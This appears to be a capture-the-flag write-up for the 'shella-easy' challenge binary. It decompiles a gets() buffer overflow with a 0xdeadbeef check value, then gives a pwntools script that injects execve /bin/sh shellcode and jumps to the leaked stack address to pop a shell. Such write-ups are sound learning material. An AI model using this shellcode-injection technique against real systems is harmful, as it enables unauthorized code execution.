In Ghidra:
```c
undefined4 main(void)
{
  char local_4c [64];
  int local_c;
  
  setvbuf(_stdout,(char *)0x0,2,0x14);
  setvbuf(_stdin,(char *)0x0,2,0x14);
  local_c = -0x35014542;
  printf("Yeah I\'ll have a %p with a side of fries thanks\n",local_4c);
  gets(local_4c);
  if (local_c != -0x21524111) {
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  return 0;
}
```

We see the classic `gets` vulnerability here, allowing us to exploit a buffer overflow. The conveniently located `local_4c` buffer is perfect to store some shellcode for us.

However, the catch is that we need `local_c` to be a specific value, otherwise the program will call `exit(0)`. Checking the pertinent assembly:

```asm
CMP        dword ptr [EBP + local_c],0xdeadbeef
```

Clearly, we need to also set `local_c` to be `0xdeadbeef` when we are overflowing.

The shellcode that we will use is our standard one for popping a shell in 32-bit binaries ([[TAMU'19 - Pwn3#^d5057a]]).

Keeping all this in mind, we can now write our exploit:
```python
from pwn import process, p32

target = process('./shella-easy')
target.recvuntil("a ")
addr = int(target.recvline().strip(b"with a side of fries thanks\n"), 16)

shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
payload = shellcode
payload += b'A' * (64 - len(shellcode))
payload += p32(0xdeadbeef)
payload += b'A' * 0x8
payload += p32(addr)

target.send(payload)
target.interactive()
```
